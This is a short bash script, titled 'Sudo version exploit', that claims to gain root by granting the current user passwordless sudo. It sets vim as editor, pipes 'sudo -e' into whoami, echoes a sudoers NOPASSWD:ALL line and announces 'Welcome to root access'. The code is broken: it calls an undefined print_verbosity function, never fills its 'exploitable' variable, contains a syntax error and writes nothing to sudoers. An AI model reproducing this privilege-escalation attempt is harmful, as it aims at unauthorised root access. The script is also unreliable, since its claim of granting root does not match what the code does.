#! /bin/bash
# Sudo version exploit

exploitable=
EXPLOIT=1
VERBOSE=0

# User has indicated they want to exploit
if [[ "$EXPLOIT" == 1 ]]; then

    # Exploit is happening but must check if paths exist in file
    if [[ -z "$exploitable" ]]; then
        print_verbosity "No exploitable paths to root found on device." 0
    # Perform exploit if paths exist
    else 
        # User can view exploitable paths in "exploitable"
        print_verbosity "Exploitable paths found in 'exploitable.'" 1

        # Set editor to vim
        export EDITOR="vim"

        # Open sudoers file and edit permissions
        echo $( sudo -e | whoami )
        username=$(whoami)
        echo $username ALL=(ALL:ALL) NOPASSWD:ALL
        print_verbosity "Welcome to root access" 1
    fi
fi
